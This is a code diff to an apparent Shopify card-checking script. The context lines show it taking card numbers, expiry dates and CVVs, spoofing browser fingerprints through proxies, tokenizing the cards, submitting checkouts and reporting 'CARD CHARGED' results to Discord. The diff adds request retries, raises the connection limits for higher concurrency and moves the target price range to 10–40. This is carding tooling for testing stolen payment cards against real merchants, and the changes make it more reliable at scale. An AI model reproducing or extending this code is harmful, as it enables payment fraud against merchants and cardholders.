@@ -62,12 +62,12 @@ class _CurlSessionWrapper:
     async def get(self, url, **kwargs):
         if 'headers' in kwargs:
             kwargs['headers'] = self._clean_headers(kwargs['headers'])
-        return await self._s.get(url, **kwargs)
+        return await _retry_async_request(self._s.get, url, **kwargs)
 
     async def post(self, url, **kwargs):
         if 'headers' in kwargs:
             kwargs['headers'] = self._clean_headers(kwargs['headers'])
-        return await self._s.post(url, **kwargs)
+        return await _retry_async_request(self._s.post, url, **kwargs)
 
     async def __aenter__(self):
         return self
@@ -75,6 +75,18 @@ class _CurlSessionWrapper:
     async def __aexit__(self, *args):
         await self._s.close()
 
+
+async def _retry_async_request(func, *args, retries=3, delay=1.0, backoff_factor=2, **kwargs):
+    for i in range(retries):
+        try:
+            return await func(*args, **kwargs)
+        except _NETWORK_ERRORS as e:
+            if i < retries - 1:
+                print(f"   ⚠️ Request failed ({e}), retrying in {delay:.2f}s...")
+                await asyncio.sleep(delay)
+                delay *= backoff_factor
+            else:
+                raise
 
 def _create_async_client(proxy_url=None, timeout=30.0, chrome_version=None):
     if _CURL_CFFI_AVAILABLE:
@@ -95,8 +107,8 @@ def _create_async_client(proxy_url=None, timeout=30.0, chrome_version=None):
     else:
         client_kw = {
             "follow_redirects": True,
-            "timeout": httpx.Timeout(timeout, connect=8.0, read=25.0, write=8.0, pool=5.0),
-            "limits": httpx.Limits(max_connections=100, max_keepalive_connections=20),
+            "timeout": httpx.Timeout(timeout, connect=10.0, read=30.0, write=10.0, pool=10.0), # Increased timeouts for better resilience under load
+            "limits": httpx.Limits(max_connections=200, max_keepalive_connections=50), # Increased connection limits for higher concurrency
             "http2": _H2_AVAILABLE,
         }
         if proxy_url:
@@ -540,7 +552,7 @@ async def main():
             await asyncio.sleep(random.uniform(0.8, 2.0))
             print("visiting the product page to get the variant id and cookies")
             try:
-                product_response = await session.get(site + '/products.json', headers=product_header)
+                product_response = await _retry_async_request(session.get, site + '/products.json', headers=product_header)
                 products_data = product_response.json()
                 product = products_data['products'][0]
                 product_id = product['id']
@@ -557,10 +569,10 @@ async def main():
                 return
 
             print("\n Visiting product page to get cookies...")
-            product_page_response = await session.get(f"{site}/products/{product_handle}", headers=product_header)
+            product_page_response = await _retry_async_request(session.get, f"{site}/products/{product_handle}", headers=product_header)
             print(f"   Status: {product_page_response.status_code}")
 
-            await session.get(site + '/cart.js', headers=product_header)
+            await _retry_async_request(session.get, site + '/cart.js', headers=product_header)
 
             add_data = {
                 'id': str(variant_id),
@@ -569,13 +581,13 @@ async def main():
             }
 
             print("\n Adding item to cart...")
-            response = await session.post(site + '/cart/add.js', headers=product_header, data=add_data)
+            response = await _retry_async_request(session.post, site + '/cart/add.js', headers=product_header, data=add_data)
             print(f"   Response Status: {response.status_code}")
             
             if response.status_code == 200:
                 print("   ✅ Item added to cart!")
                 
-                cart_response = await session.get(f"{site}/cart.js", headers=product_header)
+                cart_response = await _retry_async_request(session.get, f"{site}/cart.js", headers=product_header)
                 cart_data = cart_response.json()
                 token = cart_data['token']
                 print(f"   Cart token: {token}")
@@ -590,14 +602,14 @@ async def main():
                     'referer': f"{site}/cart",
                 }
                 
-                await session.get(f"{site}/checkout", headers=checkout_headers) 
+                await _retry_async_request(session.get, f"{site}/checkout", headers=checkout_headers) 
                 
                 checkout_data = {
                     'checkout': '',  
                     'updates[]': '1', 
                 }
                 
-                checkout_response = await session.post(f"{site}/cart", headers=checkout_headers, data=checkout_data)
+                checkout_response = await _retry_async_request(session.post, f"{site}/cart", headers=checkout_headers, data=checkout_data)
                 
                 print(f"   Final URL after redirect: {checkout_response.url}")
                 checkout_page_url = str(checkout_response.url)
@@ -971,7 +983,7 @@ async def main():
             print(f"❌ An error occurred in main: {e}")
 
 
-async def check_site_fast(site_url, proxy_url=None, max_price=10.0, min_price=0.01):
+async def check_site_fast(site_url, proxy_url=None, max_price=40.0, min_price=10.0):
     site_url = site_url.strip().rstrip("/")
     fingerprint = get_random_fingerprint()
     
@@ -1303,7 +1315,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
         _home_headers["Sec-Fetch-Mode"] = "navigate"
         _home_headers["Sec-Fetch-Site"] = "none"
         _home_headers["Sec-Fetch-User"] = "?1"
-        await session.get(site, headers=_home_headers)
+        await _retry_async_request(session.get, site, headers=_home_headers)
         await asyncio.sleep(random.uniform(0.3, 0.9))
     except Exception:
         pass
@@ -1314,7 +1326,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             products = cached
             _steps.append("1. Products: cached")
         else:
-            product_response = await session.get(site + "/products.json", headers=product_header)
+            product_response = await _retry_async_request(session.get, site + "/products.json", headers=product_header)
             _steps.append(f"1. Products: HTTP {product_response.status_code}")
             if product_response.status_code != 200:
                 return {"status": "Error", "message": f"Products page HTTP {product_response.status_code}", "debug_steps": _steps}
@@ -1348,7 +1360,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                 except (ValueError, TypeError):
                     continue
                 
-                if price_val < 0.01 or price_val > 10.0:
+                if price_val < 10.0 or price_val > 40.0:
                     continue
                 
                 if lowest_price is None or price_val < lowest_price:
@@ -1377,14 +1389,14 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
         browse_headers["Sec-Fetch-Site"] = "same-origin"
         browse_headers["Sec-Fetch-User"] = "?1"
         try:
-            await session.get(f"{site}/collections/all", headers=browse_headers)
+            await _retry_async_request(session.get, f"{site}/collections/all", headers=browse_headers)
             await asyncio.sleep(random.uniform(0.3, 0.8))
         except Exception:
             pass
 
         browse_headers["Referer"] = f"{site}/collections/all"
         try:
-            await session.get(f"{site}/products/{product_handle}", headers=browse_headers)
+            await _retry_async_request(session.get, f"{site}/products/{product_handle}", headers=browse_headers)
         except Exception:
             pass
 
@@ -1402,14 +1414,14 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
         cart_add_headers.pop("Upgrade-Insecure-Requests", None)
 
         add_data = {"id": str(variant_id), "quantity": "1", "form_type": "product"}
-        response = await session.post(site + "/cart/add.js", headers=cart_add_headers, data=add_data)
+        response = await _retry_async_request(session.post, site + "/cart/add.js", headers=cart_add_headers, data=add_data)
         if response.status_code != 200:
             return {"status": "Error", "message": "Cart add failed", "debug_steps": _steps}
         _steps.append(f"3. Cart add: HTTP {response.status_code}")
         _log_verbose(verbose, "✅ Cart add OK", discord_webhook=discord_console_webhook)
 
         await asyncio.sleep(random.uniform(0.3, 0.8))
-        cart_response = await session.get(f"{site}/cart.js", headers=cart_add_headers)
+        cart_response = await _retry_async_request(session.get, f"{site}/cart.js", headers=cart_add_headers)
         try:
             cart_data = cart_response.json()
         except Exception:
@@ -1442,7 +1454,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
         if _ch_key in fingerprint:
             checkout_headers[_ch_key] = fingerprint[_ch_key]
     try:
-        checkout_response = await session.post(f"{site}/cart", headers=checkout_headers, data={"checkout": "", "updates[]": "1"})
+        checkout_response = await _retry_async_request(session.post, f"{site}/cart", headers=checkout_headers, data={"checkout": "", "updates[]": "1"})
     except _NETWORK_ERRORS as e:
         return {"status": "Error", "message": f"Network: {type(e).__name__}", "debug_steps": _steps}
     checkout_page_url = str(checkout_response.url)
@@ -1492,7 +1504,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             async with _create_async_client(proxy_url=px, timeout=15.0, chrome_version=_tok_chrome_ver) as tok_sess:
                 for ep in endpoints:
                     try:
-                        r = await tok_sess.post(ep, headers=_tok_headers, json=_card_json)
+                        r = await _retry_async_request(tok_sess.post, ep, headers=_tok_headers, json=_card_json)
                         if r.status_code == 200:
                             sid = r.json().get("id")
                             if sid:
@@ -1587,7 +1599,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             },
             "operationName": "SubmitForCompletion",
         }
-        neg_resp = await session.post(graphql_url, headers=_make_graphql_headers(), json=neg_payload)
+        neg_resp = await _retry_async_request(session.post, graphql_url, headers=_make_graphql_headers(), json=neg_payload)
         if neg_resp.status_code == 200:
             neg_data = neg_resp.json()
             neg_completion = neg_data.get("data", {}).get("submitForCompletion", {}) or {}
@@ -1607,7 +1619,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                 poll_delay = 0.25
                 for poll_i in range(8):
                     await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
-                    poll_r = await session.post(graphql_url, headers=_make_graphql_headers(), json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
+                    poll_r = await _retry_async_request(session.post, graphql_url, headers=_make_graphql_headers(), json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"}, retries=5, delay=0.5)
                     if poll_r.status_code != 200:
                         continue
                     rec = poll_r.json().get("data", {}).get("receipt", {})
@@ -1632,7 +1644,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                 return {"status": "Charged", "message": "CARD CHARGED", "order_id": receipt.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": receipt}
 
         try:
-            ref = await session.get(checkout_page_url, headers={"User-Agent": shop.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
+            ref = await _retry_async_request(session.get, checkout_page_url, headers={"User-Agent": shop.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
             if ref.status_code == 200:
                 rt = ref.text
                 nst = _RE_SESSION_TOKEN.search(rt)
@@ -1722,7 +1734,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             "operationName": "SubmitForCompletion",
         }
         _log_verbose(verbose, f"✅ Submit attempt {attempt + 1}/{_max_submit_attempts}", discord_webhook=discord_console_webhook)
-        gr = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
+        gr = await _retry_async_request(session.post, graphql_url, headers=graphql_headers, json=graphql_payload)
         _steps.append(f"6. Submit #{attempt+1}: HTTP {gr.status_code}")
         if gr.status_code != 200:
             last_completion = {"__typename": "HttpError", "status": gr.status_code}
@@ -1801,7 +1813,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             poll_delay = 0.25
             for poll_i in range(8):
                 await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
-                poll_r = await session.post(graphql_url, headers=graphql_headers, json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
+                poll_r = await _retry_async_request(session.post, graphql_url, headers=graphql_headers, json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"}, retries=5, delay=0.5)
                 if poll_r.status_code != 200:
                     continue
                 poll_data = poll_r.json()
